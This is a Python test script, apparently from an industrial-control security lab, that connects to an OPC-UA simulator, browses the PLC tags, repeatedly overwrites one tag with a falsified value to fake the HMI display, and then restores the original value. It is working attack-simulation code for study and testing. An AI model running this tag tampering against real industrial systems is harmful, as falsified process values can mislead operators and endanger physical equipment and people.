#!/usr/bin/env python3
"""
tests/test_hmi_fake.py
Ghi đè OPC-UA tag từ IP attacker — yêu cầu opcua_sim_server đang chạy.

Chạy: python tests/test_hmi_fake.py
"""

import sys
import os
import asyncio
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *


async def run_test():
    print(f"\n{B}[TEST] HMI_FAKE_DISPLAY (OPC-UA TAGS){X}")
    info(f"Server: {OPC_URL}")

    changes = []
    observable = []
    notes = []
    error = None
    t0 = time.time()

    try:
        from asyncua import Client

        # Dùng localhost nếu sim server chạy local, không thì dùng config
        try:
            async with Client(url="opc.tcp://127.0.0.1:4840") as test_client:
                pass
            opc_url = "opc.tcp://127.0.0.1:4840"
            info("Using local OPC-UA sim server (127.0.0.1:4840)")
        except Exception:
            opc_url = OPC_URL
            info(f"Using OPC-UA from config: {opc_url}")

        async with Client(url=opc_url) as client:
            ns_idx = await client.get_namespace_index("PLC")
            ok(f"Connected, namespace PLC = {ns_idx}")

            # Browse tags
            print(f"\n  {C}[BROWSE]{X}")
            objects = client.nodes.objects
            plc = await objects.get_child(f"{ns_idx}:PLC")

            tags = {}
            for child in await plc.get_children():
                name = (await child.read_browse_name()).Name
                try:
                    val = await child.read_value()
                    tags[name] = (child, val)
                    print(f"    {name} = {val}")
                except Exception:
                    print(f"    {name} = (error)")

            if not tags:
                warn("No writable tags found — start opcua_sim_server first")
                error = "No tags"
                return

            first_tag = list(tags.keys())[0]
            node, orig_val = tags[first_tag]
            fake_val = (not orig_val) if isinstance(orig_val, bool) else round(orig_val * 1.5, 2)

            ok(f"Write to {first_tag}: {orig_val} -> {fake_val}")
            observable.append(f"OPC-UA Write: {first_tag} = {fake_val}")

            for i in range(5):
                await node.write_value(fake_val)
                check = await node.read_value()
                info(f"  #{i+1}: wrote {fake_val}, read back {check}")
                await asyncio.sleep(1)

            await node.write_value(orig_val)
            check = await node.read_value()
            ok(f"Restored {first_tag} = {check}")

            notes.append(f"Tag: {first_tag}")
            notes.append("Wireshark: opcua service WriteRequest")

    except ImportError:
        error = "asyncua not installed: pip install asyncua cryptography"
        fail(error)
    except ConnectionRefusedError:
        error = f"OPC-UA server not running at {OPC_URL} — start: python -m attacks_ext.opcua_sim_server"
        fail(error)
    except Exception as e:
        error = str(e)
        fail(str(e))

    success = error is None
    print_result("HMI_FAKE_DISPLAY", success, changes, observable, notes, time.time() - t0, error)


def main():
    asyncio.run(run_test())


if __name__ == "__main__":
    main()
